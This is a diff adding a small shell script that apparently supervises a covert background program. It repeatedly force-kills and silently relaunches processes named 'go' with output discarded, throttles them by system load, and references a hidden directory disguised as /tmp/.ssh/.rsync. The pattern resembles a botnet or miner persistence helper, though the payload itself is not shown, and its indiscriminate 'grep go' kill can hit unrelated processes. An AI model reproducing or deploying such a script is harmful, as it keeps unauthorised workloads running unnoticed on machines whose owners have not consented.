@@ -1,0 +1,28 @@
+#!/bin/sh
+dir=$(cat dir.dir)
+cd $dir
+ps x|grep go>pgo
+nrgo=$(wc -l < pgo)
+
+#if [ $(wc -l < n) -lt 10 ]; then
+#nohup ./stop >>/dev/null &
+#sleep 10
+#rm -rf /tmp/.ssh/.rsync/c
+#fi
+
+if [ $nrgo -gt 5 ]; then
+kill -9 `ps x|grep go|grep -v grep|awk '{print $1}'` >>/dev/null &
+sleep 5
+nohup ./go 100 >>/dev/null &
+fi
+
+load=$(uptime | awk -F "." '{ print $1 }' | awk -F ":" '{ print $5 }')
+
+if [ $load -gt 101 ]; then
+nohup ./stop >>/dev/null &
+sleep 10
+nohup ./go 50 >>/dev/null &
+fi
+
+exit 0
+
